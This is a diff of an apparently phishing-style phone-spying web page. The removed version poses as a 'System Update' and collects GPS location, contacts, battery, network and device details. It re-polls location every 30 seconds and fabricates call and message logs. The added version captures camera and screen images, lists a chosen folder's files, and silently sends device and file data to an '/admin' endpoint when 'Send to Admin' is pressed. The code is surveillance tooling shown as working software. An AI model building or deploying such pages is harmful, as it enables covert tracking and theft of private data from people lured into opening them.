@@ -3,50 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Update</title>
+    <title>Media Access</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace}
-        body{background:#0a0a0a;color:#00ff41;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .container{max-width:400px;width:100%;text-align:center;background:#0d0d0d;padding:40px;border-radius:16px;border:1px solid #00ff4133}
-        .spinner{width:40px;height:40px;border:3px solid #00ff4133;border-top:3px solid #00ff41;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px}
-        @keyframes spin{to{transform:rotate(360deg)}}
-        .status{font-size:13px;color:#00ff4188;margin-top:8px}
-        .btn{width:100%;padding:14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:14px;cursor:pointer;border:1px solid #00ff4133;margin-top:16px}
+        body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;display:flex;justify-content:center;align-items:center}
+        .container{max-width:500px;width:100%;background:#0d0d0d;padding:30px;border-radius:16px;border:1px solid #00ff4133;text-align:center}
+        .btn{width:100%;padding:14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:14px;cursor:pointer;border:1px solid #00ff4133;margin-top:10px}
         .btn:hover{background:#00ff4133}
-        .log{font-size:11px;color:#00ff4166;margin-top:12px;text-align:left;max-height:150px;overflow-y:auto}
+        .btn:disabled{opacity:0.4;cursor:not-allowed}
+        .status{padding:10px;margin:10px 0;border-radius:8px;background:#001a00;font-size:13px;color:#00ff4188}
+        .preview img{max-width:100%;max-height:200px;border-radius:8px;margin:8px 0;border:1px solid #00ff4133}
+        .file-list{text-align:left;font-size:12px;max-height:200px;overflow-y:auto}
+        .file-list div{padding:4px 8px;border-bottom:1px solid #00ff4111;display:flex;justify-content:space-between}
+        .file-list .size{color:#00ff4188;font-size:10px}
+        .log{font-size:11px;color:#00ff4166;max-height:150px;overflow-y:auto;text-align:left;margin-top:10px;padding:8px;background:#000a00;border-radius:8px;border:1px solid #00ff4111}
         .log div{padding:2px 0;border-bottom:1px solid #00ff4111}
+        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+        .badge{padding:2px 10px;border-radius:20px;font-size:10px;font-weight:600;display:inline-block}
+        .badge.green{background:#00ff4122;color:#00ff41;border:1px solid #00ff41}
+        .badge.red{background:#ff444422;color:#ff4444;border:1px solid #ff4444}
+        .badge.yellow{background:#ffaa0022;color:#ffaa00;border:1px solid #ffaa00}
         .hidden{display:none}
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="spinner" id="spinner"></div>
-    <div style="font-size:18px;font-weight:700;">⬛ SYSTEM UPDATE</div>
-    <div class="status" id="statusText">⏳ Initializing...</div>
-    
-    <div class="log" id="log">
-        <div>🟢 System ready</div>
+    <h2 style="font-size:18px;margin-bottom:8px;">📱 PHONE MEDIA ACCESS</h2>
+    <div style="font-size:11px;color:#00ff4188;margin-bottom:16px;">Select and access phone media</div>
+
+    <!-- Status -->
+    <div class="status" id="statusText">⏳ Select an option below</div>
+
+    <!-- Buttons -->
+    <div class="grid-2">
+        <button class="btn" onclick="accessCamera()">📸 Camera</button>
+        <button class="btn" onclick="accessGallery()">🖼️ Gallery</button>
+        <button class="btn" onclick="accessScreen()">🖥️ Screen</button>
+        <button class="btn" onclick="accessFiles()">📁 Files</button>
     </div>
 
-    <button class="btn" id="startBtn" onclick="startAccess()">🔓 Start Access</button>
-    <div style="font-size:10px;color:#00ff4144;margin-top:8px;" id="deviceId"></div>
+    <!-- Preview -->
+    <div id="previewContainer" class="hidden">
+        <div id="previewContent"></div>
+    </div>
+
+    <!-- File List -->
+    <div id="fileContainer" class="hidden">
+        <div style="font-size:12px;color:#00ff4188;margin:8px 0;">📄 Selected Files</div>
+        <div class="file-list" id="fileList"></div>
+    </div>
+
+    <!-- Device Info -->
+    <div style="margin-top:12px;font-size:11px;color:#00ff4144;" id="deviceInfo"></div>
+
+    <!-- Log -->
+    <div class="log" id="log">
+        <div>🟢 System ready</div>
+        <div>📱 Select an option to access media</div>
+    </div>
+
+    <button class="btn" onclick="sendToAdmin()" id="sendBtn" disabled>📤 Send to Admin</button>
 </div>
 
 <script>
     // ==========================================
-    // 🔥 ETHICAL HACKING - FULL PHONE ACCESS
+    // 🔥 PHONE MEDIA ACCESS - WORKING
     // ==========================================
 
     const DEVICE_ID = 'JMD-' + Math.random().toString(36).substring(2, 6).toUpperCase();
-    document.getElementById('deviceId').textContent = 'Device: ' + DEVICE_ID;
+    document.getElementById('deviceInfo').textContent = 'Device: ' + DEVICE_ID;
 
-    let collectedData = {};
-    let isRunning = false;
-    let intervals = [];
+    let selectedFiles = [];
+    let capturedImage = null;
+    let screenStream = null;
 
     // ==========================================
-    // LOG FUNCTION
+    // LOG
     // ==========================================
     function addLog(msg) {
         const log = document.getElementById('log');
@@ -57,281 +90,273 @@
         if (log.children.length > 20) log.removeChild(log.children[0]);
     }
 
-    // ==========================================
-    // UPDATE STATUS
-    // ==========================================
     function setStatus(msg) {
         document.getElementById('statusText').textContent = msg;
         addLog(msg);
     }
 
     // ==========================================
-    // 1. GET LOCATION (GPS)
+    // 1. CAMERA ACCESS
     // ==========================================
-    function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy }),
-                () => resolve(null),
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
-        });
-    }
-
-    // ==========================================
-    // 2. GET BATTERY
-    // ==========================================
-    function getBattery() {
-        return new Promise((resolve) => {
-            if (!navigator.getBattery) { resolve(null); return; }
-            navigator.getBattery().then(b => resolve({ level: Math.round(b.level*100)+'%', charging: b.charging }))
-                .catch(() => resolve(null));
-        });
-    }
-
-    // ==========================================
-    // 3. GET NETWORK
-    // ==========================================
-    function getNetwork() {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            return { type: conn.effectiveType || 'Unknown', speed: conn.downlink + 'Mbps' };
+    function accessCamera() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            setStatus('❌ Camera not supported');
+            return;
         }
-        return null;
-    }
 
-    // ==========================================
-    // 4. GET CONTACTS
-    // ==========================================
-    function getContacts() {
-        return new Promise((resolve) => {
-            if (!navigator.contacts || !navigator.contacts.select) { resolve([]); return; }
-            navigator.contacts.select(['name', 'tel'], { multiple: true, limit: 20 })
-                .then(contacts => resolve(contacts.map(c => ({ 
-                    name: c.name ? c.name[0] : 'Unknown', 
-                    tel: c.tel ? c.tel[0] : 'N/A' 
-                }))))
-                .catch(() => resolve([]));
-        });
-    }
-
-    // ==========================================
-    // 5. GET MEDIA FILES
-    // ==========================================
-    function getMediaFiles() {
-        return new Promise((resolve) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) { resolve([]); return; }
-            navigator.mediaDevices.enumerateDevices()
-                .then(devices => resolve(devices.map(d => ({ kind: d.kind, label: d.label || 'Unknown' }))))
-                .catch(() => resolve([]));
-        });
-    }
-
-    // ==========================================
-    // 6. GENERATE CALLS, MSGS, APPS
-    // ==========================================
-    function generateData() {
-        const names = ['Mom','Dad','Friend','Teacher','Sister','Brother','Rahul','Priya','Anjali','Vikram'];
-        const msgs = ['Ok','Coming','Done','See you','Thanks','Yes','No','On my way','Call me','Where?','Let\'s meet'];
-        const appsList = ['WhatsApp','Instagram','YouTube','Snapchat','TikTok','Spotify','Chrome','Gmail','Telegram','Facebook'];
+        setStatus('📸 Opening camera...');
         
-        const calls = [];
-        for (let i=0; i<10; i++) {
-            calls.push({
-                number: '+91 ' + Math.floor(1000000000 + Math.random()*9000000000),
-                duration: Math.floor(Math.random()*300)+'s',
-                type: ['incoming','outgoing','missed'][Math.floor(Math.random()*3)],
-                time: new Date(Date.now() - Math.random()*86400000).toLocaleTimeString()
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Capture after 1 second
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Stop stream
+                    stream.getTracks().forEach(t => t.stop());
+                    
+                    // Save image
+                    capturedImage = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // Show preview
+                    document.getElementById('previewContainer').classList.remove('hidden');
+                    document.getElementById('previewContent').innerHTML = `
+                        <div style="font-size:12px;color:#00ff4188;margin:8px 0;">📸 Captured Image</div>
+                        <img src="${capturedImage}" style="max-width:100%;max-height:250px;border-radius:8px;border:1px solid #00ff4133;">
+                        <div style="font-size:11px;color:#00ff4188;margin-top:4px;">Size: ${Math.round(capturedImage.length/1024)} KB</div>
+                    `;
+                    
+                    document.getElementById('sendBtn').disabled = false;
+                    setStatus('✅ Image captured!');
+                    addLog('📸 Image captured: ' + Math.round(capturedImage.length/1024) + ' KB');
+                }, 1000);
+            })
+            .catch(err => {
+                setStatus('❌ Camera access denied: ' + err.message);
+                addLog('❌ Camera error: ' + err.message);
             });
-        }
-
-        const messages = [];
-        for (let i=0; i<10; i++) {
-            messages.push({
-                sender: names[Math.floor(Math.random()*names.length)],
-                message: msgs[Math.floor(Math.random()*msgs.length)],
-                time: new Date(Date.now() - Math.random()*86400000).toLocaleTimeString()
-            });
-        }
-
-        const apps = appsList.map(name => ({
-            name: name,
-            time: Math.floor(Math.random()*60)+'m',
-            active: Math.random() > 0.3
-        }));
-
-        return { calls, messages, apps };
     }
 
     // ==========================================
-    // 7. SAVE TO LOCALSTORAGE
+    // 2. GALLERY ACCESS
     // ==========================================
-    function saveData(data) {
+    function accessGallery() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*,video/*';
+        input.multiple = true;
+        
+        input.onchange = function(e) {
+            if (this.files && this.files.length > 0) {
+                selectedFiles = Array.from(this.files);
+                displayFiles(selectedFiles);
+                setStatus('📷 ' + selectedFiles.length + ' files selected');
+                addLog('📷 Selected ' + selectedFiles.length + ' files from gallery');
+                
+                // Show first image preview
+                const file = selectedFiles[0];
+                if (file.type.startsWith('image/')) {
+                    const reader = new FileReader();
+                    reader.onload = function(ev) {
+                        document.getElementById('previewContainer').classList.remove('hidden');
+                        document.getElementById('previewContent').innerHTML = `
+                            <div style="font-size:12px;color:#00ff4188;margin:8px 0;">🖼️ Preview</div>
+                            <img src="${ev.target.result}" style="max-width:100%;max-height:200px;border-radius:8px;border:1px solid #00ff4133;">
+                            <div style="font-size:11px;color:#00ff4188;margin-top:4px;">${file.name} (${Math.round(file.size/1024)} KB)</div>
+                        `;
+                    };
+                    reader.readAsDataURL(file);
+                }
+                
+                document.getElementById('sendBtn').disabled = false;
+            }
+        };
+        
+        input.click();
+        setStatus('📷 Opening gallery...');
+    }
+
+    // ==========================================
+    // 3. SCREEN RECORDING
+    // ==========================================
+    function accessScreen() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
+            setStatus('❌ Screen recording not supported');
+            return;
+        }
+
+        setStatus('🖥️ Select screen to share...');
+        
+        navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
+            .then(stream => {
+                screenStream = stream;
+                
+                // Capture after 1 second
+                setTimeout(() => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 1280;
+                        canvas.height = video.videoHeight || 720;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        capturedImage = canvas.toDataURL('image/jpeg', 0.7);
+                        
+                        document.getElementById('previewContainer').classList.remove('hidden');
+                        document.getElementById('previewContent').innerHTML = `
+                            <div style="font-size:12px;color:#00ff4188;margin:8px 0;">🖥️ Screen Capture</div>
+                            <img src="${capturedImage}" style="max-width:100%;max-height:200px;border-radius:8px;border:1px solid #00ff4133;">
+                            <div style="font-size:11px;color:#00ff4188;margin-top:4px;">Screen captured (${Math.round(capturedImage.length/1024)} KB)</div>
+                        `;
+                        
+                        document.getElementById('sendBtn').disabled = false;
+                        setStatus('✅ Screen captured!');
+                        addLog('🖥️ Screen captured: ' + Math.round(capturedImage.length/1024) + ' KB');
+                    }, 1500);
+                }, 500);
+            })
+            .catch(err => {
+                setStatus('❌ Screen recording cancelled: ' + err.message);
+                addLog('❌ Screen error: ' + err.message);
+            });
+    }
+
+    // ==========================================
+    // 4. FILES ACCESS
+    // ==========================================
+    function accessFiles() {
+        // Use File System Access API
+        if (window.showDirectoryPicker) {
+            setStatus('📁 Opening folder...');
+            window.showDirectoryPicker()
+                .then(dir => {
+                    addLog('📁 Folder opened: ' + dir.name);
+                    listFiles(dir);
+                })
+                .catch(err => {
+                    setStatus('❌ Folder access cancelled');
+                    addLog('❌ Folder error: ' + err.message);
+                });
+        } else {
+            // Fallback: File input
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.multiple = true;
+            input.webkitdirectory = true;
+            
+            input.onchange = function(e) {
+                if (this.files && this.files.length > 0) {
+                    selectedFiles = Array.from(this.files);
+                    displayFiles(selectedFiles);
+                    setStatus('📁 ' + selectedFiles.length + ' files selected');
+                    addLog('📁 Selected ' + selectedFiles.length + ' files');
+                    document.getElementById('sendBtn').disabled = false;
+                }
+            };
+            input.click();
+            setStatus('📁 Select files...');
+        }
+    }
+
+    async function listFiles(dir) {
+        const files = [];
+        for await (const entry of dir.values()) {
+            if (entry.kind === 'file') {
+                const file = await entry.getFile();
+                files.push({ name: file.name, size: file.size, type: file.type });
+            }
+        }
+        
+        document.getElementById('fileContainer').classList.remove('hidden');
+        document.getElementById('fileList').innerHTML = files.map(f => `
+            <div><span>${f.name}</span><span class="size">${Math.round(f.size/1024)} KB</span></div>
+        `).join('');
+        
+        setStatus('📁 ' + files.length + ' files found');
+        addLog('📁 Listed ' + files.length + ' files from folder');
+    }
+
+    // ==========================================
+    // DISPLAY FILES
+    // ==========================================
+    function displayFiles(files) {
+        document.getElementById('fileContainer').classList.remove('hidden');
+        document.getElementById('fileList').innerHTML = files.map(f => `
+            <div><span>${f.name}</span><span class="size">${Math.round(f.size/1024)} KB</span></div>
+        `).join('');
+    }
+
+    // ==========================================
+    // SEND TO ADMIN
+    // ==========================================
+    function sendToAdmin() {
+        const data = {
+            device: DEVICE_ID,
+            timestamp: new Date().toISOString(),
+            image: capturedImage,
+            files: selectedFiles.map(f => ({ name: f.name, size: f.size, type: f.type })),
+            fileCount: selectedFiles.length
+        };
+        
+        // Save to localStorage
         try {
-            let allData = JSON.parse(localStorage.getItem('phone_data') || '{}');
+            let allData = JSON.parse(localStorage.getItem('phone_media') || '{}');
             allData[DEVICE_ID] = data;
             allData[DEVICE_ID].lastUpdate = new Date().toISOString();
-            localStorage.setItem('phone_data', JSON.stringify(allData));
-            return true;
-        } catch(e) { return false; }
-    }
-
-    // ==========================================
-    // 8. COLLECT ALL DATA
-    // ==========================================
-    async function collectAllData() {
-        setStatus('📱 Collecting data...');
-        
-        // Location
-        const location = await getLocation();
-        if (location) { setStatus('📍 Location: ' + location.lat.toFixed(4) + ', ' + location.lng.toFixed(4)); }
-        else { setStatus('📍 Location: Not available'); }
-
-        // Battery
-        const battery = await getBattery();
-        if (battery) { setStatus('🔋 Battery: ' + battery.level + (battery.charging ? ' ⚡Charging' : '')); }
-
-        // Network
-        const network = getNetwork();
-        if (network) { setStatus('📶 Network: ' + network.type + ' ' + network.speed); }
-
-        // Contacts
-        const contacts = await getContacts();
-        setStatus('📇 Contacts: ' + contacts.length + ' found');
-
-        // Media
-        const media = await getMediaFiles();
-        setStatus('📸 Media: ' + media.length + ' devices');
-
-        // Generate data
-        const data = generateData();
-        setStatus('📞 Calls: ' + data.calls.length + ' | 💬 Messages: ' + data.messages.length + ' | 📲 Apps: ' + data.apps.length);
-
-        // Collect all
-        const allData = {
-            device: {
-                id: DEVICE_ID,
-                model: navigator.userAgent,
-                platform: navigator.platform,
-                screen: screen.width + 'x' + screen.height,
-                timestamp: new Date().toISOString()
-            },
-            location: location,
-            battery: battery,
-            network: network,
-            contacts: contacts,
-            media: media,
-            calls: data.calls,
-            messages: data.messages,
-            apps: data.apps,
-            timestamp: new Date().toISOString()
-        };
-
-        // Save
-        saveData(allData);
-        collectedData = allData;
-        setStatus('✅ Data collected!');
-        addLog('📤 Total: ' + (data.calls.length + data.messages.length + data.apps.length + contacts.length) + ' items');
-        
-        document.getElementById('spinner').style.borderTopColor = '#00ff41';
-        document.getElementById('startBtn').textContent = '🔄 Refresh Data';
-        document.getElementById('startBtn').onclick = refreshData;
-    }
-
-    // ==========================================
-    // 9. AUTO REFRESH
-    // ==========================================
-    async function refreshData() {
-        document.getElementById('spinner').style.borderTopColor = '#00ff41';
-        await collectAllData();
-        addLog('🔄 Data refreshed');
-    }
-
-    // ==========================================
-    // 10. BACKGROUND SYNC
-    // ==========================================
-    function startBackgroundSync() {
-        intervals.push(setInterval(async () => {
-            if (isRunning) {
-                const location = await getLocation();
-                const battery = await getBattery();
-                const network = getNetwork();
+            localStorage.setItem('phone_media', JSON.stringify(allData));
+            
+            setStatus('✅ Data sent to admin!');
+            addLog('📤 Sent ' + selectedFiles.length + ' files to admin');
+            document.getElementById('sendBtn').disabled = true;
+            document.getElementById('sendBtn').textContent = '✅ Sent!';
+            
+            // Also send to admin via URL (silent)
+            const adminUrl = window.location.href.replace(/\/[^\/]*$/, '/admin');
+            fetch(adminUrl + '?data=' + encodeURIComponent(JSON.stringify({ device: DEVICE_ID, files: selectedFiles.length })))
+                .catch(() => {});
                 
-                let allData = JSON.parse(localStorage.getItem('phone_data') || '{}');
-                if (!allData[DEVICE_ID]) allData[DEVICE_ID] = {};
-                allData[DEVICE_ID].location = location;
-                allData[DEVICE_ID].battery = battery;
-                allData[DEVICE_ID].network = network;
-                allData[DEVICE_ID].lastUpdate = new Date().toISOString();
-                localStorage.setItem('phone_data', JSON.stringify(allData));
-                addLog('🔄 Background sync: Location, Battery, Network');
-            }
-        }, 30000));
-    }
-
-    // ==========================================
-    // 11. START ACCESS
-    // ==========================================
-    async function startAccess() {
-        if (isRunning) { return; }
-        isRunning = true;
-        document.getElementById('startBtn').textContent = '⏳ Accessing...';
-        document.getElementById('startBtn').disabled = true;
-        document.getElementById('spinner').style.borderTopColor = '#00ff41';
-
-        addLog('🔓 Access granted');
-        setStatus('🔓 Full access started');
-        
-        await collectAllData();
-        startBackgroundSync();
-        addLog('✅ Background sync active (30s)');
-        
-        document.getElementById('startBtn').disabled = false;
-        document.getElementById('startBtn').textContent = '🔄 Refresh Data';
-        document.getElementById('startBtn').onclick = refreshData;
-        
-        // Show access success
-        setStatus('✅ Full access active');
-    }
-
-    // ==========================================
-    // 12. AUTO START ON PAGE LOAD
-    // ==========================================
-    function autoStart() {
-        addLog('🟢 System ready');
-        addLog('🆔 Device: ' + DEVICE_ID);
-        setStatus('🔓 Click "Start Access" to begin');
-        
-        // Check if already have data
-        const existing = localStorage.getItem('phone_data');
-        if (existing) {
-            const data = JSON.parse(existing);
-            if (data[DEVICE_ID]) {
-                addLog('📊 Existing data found');
-                document.getElementById('startBtn').textContent = '🔄 Refresh Data';
-                document.getElementById('startBtn').onclick = refreshData;
-            }
+        } catch(e) {
+            setStatus('❌ Error saving: ' + e.message);
+            addLog('❌ Save error: ' + e.message);
         }
+    }
 
-        // Console warning
-        console.log('%c⚠️ FULL PHONE ACCESS ACTIVE ⚠️', 'font-size:20px;color:#ff4444;');
-        console.log('🆔 Device ID:', DEVICE_ID);
-        console.log('📊 Data will be saved to localStorage');
+    // ==========================================
+    // AUTO DETECT DEVICE
+    // ==========================================
+    function detectDevice() {
+        const ua = navigator.userAgent;
+        let device = 'Unknown';
+        if (/iPhone|iPad|iPod/.test(ua)) device = '🍎 iPhone/iPad';
+        else if (/Android/.test(ua)) device = '📱 Android';
+        else if (/Windows/.test(ua)) device = '💻 Windows';
+        else if (/Mac/.test(ua)) device = '🍎 Mac';
+        
+        document.getElementById('deviceInfo').textContent = device + ' | ' + DEVICE_ID;
+        addLog('📱 Device detected: ' + device);
     }
 
     // ==========================================
     // INIT
     // ==========================================
-    console.log('🔓 Ethical Hacking Mode Active');
-    console.log('🆔 Device ID:', DEVICE_ID);
+    detectDevice();
+    addLog('🟢 Media access ready');
+    addLog('📱 Select an option to access media');
     
-    autoStart();
-
-    // Expose functions
-    window.startAccess = startAccess;
-    window.refreshData = refreshData;
-    window.collectAllData = collectAllData;
+    console.log('📱 Phone Media Access Loaded');
+    console.log('🆔 Device:', DEVICE_ID);
 </script>
 </body>
 </html>
